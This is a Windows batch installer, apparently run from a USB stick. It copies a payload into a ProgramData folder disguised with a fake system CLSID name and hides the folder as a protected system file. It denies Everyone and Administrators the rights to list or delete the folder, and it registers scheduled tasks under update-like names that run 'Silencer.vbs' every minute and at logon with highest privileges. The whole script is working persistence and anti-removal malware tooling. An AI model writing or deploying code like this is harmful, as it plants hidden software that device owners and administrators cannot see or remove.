@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (echo [!] Run as Admin & pause & exit)

set "fakeID=SystemUpdate.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
set "laptopPath=C:\ProgramData\%fakeID%\WinServiceUpdate\WinServiceUpdate\SourceFiles"
set "usbPath=%~dp0WinServiceUpdate\WinServiceUpdate\WinServiceUpdate\SourceFiles"

echo [1/3] Mirroring Files...
if not exist "%laptopPath%" mkdir "%laptopPath%" >nul 2>&1
xcopy /e /y /i "%usbPath%\*" "%laptopPath%\"

echo [2/3] Applying Smart Locks...
:: Remove inheritance and grant Read/Execute (so the goose can actually live)
icacls "C:\ProgramData\%fakeID%" /inheritance:r >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /grant:r SYSTEM:(OI)(CI)RX >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /grant:r Administrators:(OI)(CI)RX >nul 2>&1

:: DENY List Folder (RD) and Delete (DE) to hide contents and prevent removal
icacls "C:\ProgramData\%fakeID%" /deny *S-1-1-0:(RD,DE) >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /deny Administrators:(RD,DE) >nul 2>&1

:: Hide as a Protected System File
attrib +h +s +r "C:\ProgramData\%fakeID%" /s /d >nul 2>&1

echo [3/3] Setting Ultra-Persistent Triggers (1-min + Login)...
:: Trigger 1: Every 1 minute
schtasks /create /f /tn "WinServiceUpdate" /tr "wscript.exe \"%laptopPath%\Silencer.vbs\"" /sc minute /mo 1 /rl HIGHEST >nul 2>&1

:: Trigger 2: At every Logon
schtasks /create /f /tn "WinServiceUpdate_Startup" /tr "wscript.exe \"%laptopPath%\Silencer.vbs\"" /sc onlogon /rl HIGHEST >nul 2>&1

echo Launching...
start "" "wscript.exe" "%laptopPath%\Silencer.vbs"
echo DONE!
pause